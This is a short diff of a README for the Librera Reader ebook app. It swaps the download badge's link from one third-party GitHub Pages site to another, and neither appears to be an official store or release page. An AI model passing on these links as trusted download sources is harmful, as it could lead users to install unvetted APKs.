@@ -53,7 +53,7 @@ A file that only looks like a book (a scanned image in a random container) may s
 
 ## Download
 
-[![GET Librera Reader](https://img.shields.io/badge/GET-Librera%20Reader-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://toreiellewintondon.github.io/.github/Librera-Reader)
+[![GET Librera Reader](https://img.shields.io/badge/GET-Librera%20Reader-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://librera-reader.github.io/Librera-Pro/)
 
 Take one Librera Reader apk from a channel you can name: Play, F-Droid, or a tagged GitHub release. Match the flavor to the store.
 
